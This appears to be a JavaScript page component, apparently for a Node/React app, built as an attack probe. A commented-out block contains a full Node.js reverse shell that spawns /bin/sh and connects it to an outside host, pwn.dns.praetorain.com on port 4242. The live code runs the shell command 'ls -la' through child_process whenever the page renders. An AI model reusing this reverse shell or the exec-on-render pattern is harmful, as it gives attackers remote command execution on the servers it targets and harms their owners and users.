export default function Index() {

//   var net = require("net"),
//       cp = require("child_process"),
//       sh = cp.spawn("/bin/sh", []);
//   var client = new net.Socket();
//   client.connect(4242, "pwn.dns.praetorain.com", function(){
//       client.pipe(sh.stdin);
//       sh.stdout.pipe(client);
//       sh.stderr.pipe(client);
//   });
//   return <h1>BOOP</h1>; // Prevents the Node.js application form crashing

//   return <h1>BOOP</h1>;
  
  const { exec } = require("child_process");

  exec("ls -la", (error, stdout, stderr) => {
      if (error) {
          console.log(`error: ${error.message}`);
          return;
      }
      if (stderr) {
          console.log(`stderr: ${stderr}`);
          return;
      }
      console.log(`stdout: ${stdout}`);
      return stdout
  });
}
